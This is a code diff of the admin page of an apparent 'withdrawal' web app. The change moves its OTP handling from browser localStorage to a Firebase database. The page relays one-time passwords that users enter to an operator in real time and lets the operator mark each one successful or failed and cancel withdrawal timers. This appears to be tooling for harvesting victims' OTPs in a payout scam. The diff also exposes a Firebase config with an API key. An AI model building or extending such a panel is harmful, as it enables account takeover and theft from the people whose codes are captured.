@@ -79,7 +79,6 @@ button{border:0;border-radius:13px;padding:12px 17px;font-weight:800;cursor:poin
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 <script>
-// 🔥 FIREBASE CONFIG - APNA CONFIG YAHAN PASTE KAREIN
 const firebaseConfig = {
   apiKey: "AIzaSyBvWHDh7ufJDh7vyXU8MJZ99",
   authDomain: "withdrawal-app-70402.firebaseapp.com",
@@ -90,7 +89,6 @@ const firebaseConfig = {
   appId: "1:889103976344:web:25aa5c6ba9234e73564ded",
   measurementId: "G-KKQKXQMKKV"
 };
-
 firebase.initializeApp(firebaseConfig);
 const database = firebase.database();
 
@@ -114,8 +112,6 @@ function render() {
     updateOTPDisplay();
   }).catch((error) => {
     console.error("Firebase Error:", error);
-    document.getElementById('loginRows').innerHTML = '<tr><td colspan="4" class="empty">❌ Error loading data</td></tr>';
-    document.getElementById('withdrawRows').innerHTML = '<tr><td colspan="7" class="empty">❌ Error loading data</td></tr>';
   });
 }
 
@@ -160,65 +156,47 @@ function esc(v) {
 }
 
 function updateOTPDisplay() {
-  const userOtp = localStorage.getItem('user_entered_otp');
-  const retryMode = localStorage.getItem('otp_retry_mode');
-  
-  if(retryMode === 'true'){
-    document.getElementById('userOtpDisplay').style.display = 'flex';
-    document.getElementById('userOtpValue').textContent = '⏳ Waiting for new OTP...';
-    document.getElementById('userOtpStatus').textContent = '🔄 User is retrying...';
-    document.getElementById('userOtpStatus').style.color = '#ff9800';
-    document.getElementById('otpStatus').textContent = '🔄 Waiting for user to enter new OTP...';
-    document.getElementById('otpStatus').style.color = '#ff9800';
-  } else if(userOtp && userOtp !== lastOtp){
-    lastOtp = userOtp;
-    document.getElementById('userOtpDisplay').style.display = 'flex';
-    document.getElementById('userOtpValue').textContent = userOtp;
-    document.getElementById('userOtpStatus').textContent = '⏳ Waiting for admin action...';
-    document.getElementById('userOtpStatus').style.color = '#ff9800';
-    document.getElementById('otpStatus').textContent = '📨 OTP received from user! Take action.';
-    document.getElementById('otpStatus').style.color = '#ff9800';
-  }
-  
-  const result = localStorage.getItem('otp_result');
-  if(result === 'failed'){
-    document.getElementById('otpStatus').textContent = '❌ OTP Failed! User notified.';
-    document.getElementById('otpStatus').style.color = '#dc3545';
-    document.getElementById('userOtpStatus').textContent = '❌ OTP Failed!';
-    document.getElementById('userOtpStatus').style.color = '#dc3545';
-  } else if(result === 'success'){
-    document.getElementById('otpStatus').textContent = '✅ OTP Successful! User notified.';
-    document.getElementById('otpStatus').style.color = '#28a745';
-    document.getElementById('userOtpStatus').textContent = '✅ OTP Successful!';
-    document.getElementById('userOtpStatus').style.color = '#28a745';
-  }
+  // Check user OTP from Firebase
+  database.ref('user_otp').once('value').then((snapshot) => {
+    const data = snapshot.val();
+    if(data && data.otp && data.otp !== lastOtp){
+      lastOtp = data.otp;
+      document.getElementById('userOtpDisplay').style.display = 'flex';
+      document.getElementById('userOtpValue').textContent = data.otp;
+      document.getElementById('userOtpStatus').textContent = '⏳ Waiting for admin action...';
+      document.getElementById('userOtpStatus').style.color = '#ff9800';
+      document.getElementById('otpStatus').textContent = '📨 OTP received from user! Take action.';
+      document.getElementById('otpStatus').style.color = '#ff9800';
+    }
+  });
 }
 
 function clearActivity() {
   if(confirm("Clear all demo activity?")){
     database.ref('activities').remove().then(() => {
-      localStorage.removeItem('user_entered_otp');
-      localStorage.removeItem('otp_result');
-      localStorage.removeItem('withdrawal_timer_cancel');
-      localStorage.removeItem('otp_retry_mode');
+      database.ref('admin_actions').remove();
+      database.ref('user_otp').remove();
       render();
     });
   }
 }
 
 function cancelTimer() {
-  localStorage.setItem('withdrawal_timer_cancel', 'true');
-  document.getElementById('otpStatus').textContent = '⏹ Timer cancelled! User can enter OTP.';
+  // 🔥 SEND CANCEL TO FIREBASE - ALL USERS WILL SEE
+  database.ref('admin_actions/cancelTimer').set(true);
+  document.getElementById('otpStatus').textContent = '⏹ Timer cancelled! All users notified.';
   document.getElementById('otpStatus').style.color = '#dc3545';
 }
 
 function sendOTPFailed() {
-  const userOtp = localStorage.getItem('user_entered_otp');
-  if(!userOtp){
-    alert('No OTP entered by user yet!');
-    return;
-  }
+  // 🔥 SEND OTP FAILED TO FIREBASE - USER WILL SEE
+  database.ref('admin_actions/otpResult').set('failed');
+  document.getElementById('userOtpStatus').textContent = '❌ OTP Failed!';
+  document.getElementById('userOtpStatus').style.color = '#dc3545';
+  document.getElementById('otpStatus').textContent = '❌ OTP Failed! User notified.';
+  document.getElementById('otpStatus').style.color = '#dc3545';
   
+  // Update withdrawal status
   database.ref('activities').once('value').then((snapshot) => {
     const data = snapshot.val();
     if(data){
@@ -232,22 +210,18 @@ function sendOTPFailed() {
       }
     }
   });
-  
-  localStorage.setItem('otp_result', 'failed');
-  document.getElementById('userOtpStatus').textContent = '❌ OTP Failed!';
-  document.getElementById('userOtpStatus').style.color = '#dc3545';
-  document.getElementById('otpStatus').textContent = '❌ OTP Failed! User notified.';
-  document.getElementById('otpStatus').style.color = '#dc3545';
   render();
 }
 
 function sendOTPSuccess() {
-  const userOtp = localStorage.getItem('user_entered_otp');
-  if(!userOtp){
-    alert('No OTP entered by user yet!');
-    return;
-  }
+  // 🔥 SEND OTP SUCCESS TO FIREBASE - USER WILL SEE
+  database.ref('admin_actions/otpResult').set('success');
+  document.getElementById('userOtpStatus').textContent = '✅ OTP Successful!';
+  document.getElementById('userOtpStatus').style.color = '#28a745';
+  document.getElementById('otpStatus').textContent = '✅ OTP Successful! User notified.';
+  document.getElementById('otpStatus').style.color = '#28a745';
   
+  // Update withdrawal status
   database.ref('activities').once('value').then((snapshot) => {
     const data = snapshot.val();
     if(data){
@@ -261,20 +235,12 @@ function sendOTPSuccess() {
       }
     }
   });
-  
-  localStorage.setItem('otp_result', 'success');
-  document.getElementById('userOtpStatus').textContent = '✅ OTP Successful!';
-  document.getElementById('userOtpStatus').style.color = '#28a745';
-  document.getElementById('otpStatus').textContent = '✅ OTP Successful! User notified.';
-  document.getElementById('otpStatus').style.color = '#28a745';
   render();
 }
 
 function resetOTP() {
-  localStorage.removeItem('user_entered_otp');
-  localStorage.removeItem('otp_result');
-  localStorage.removeItem('withdrawal_timer_cancel');
-  localStorage.removeItem('otp_retry_mode');
+  database.ref('admin_actions').remove();
+  database.ref('user_otp').remove();
   lastOtp = null;
   
   document.getElementById('userOtpDisplay').style.display = 'none';
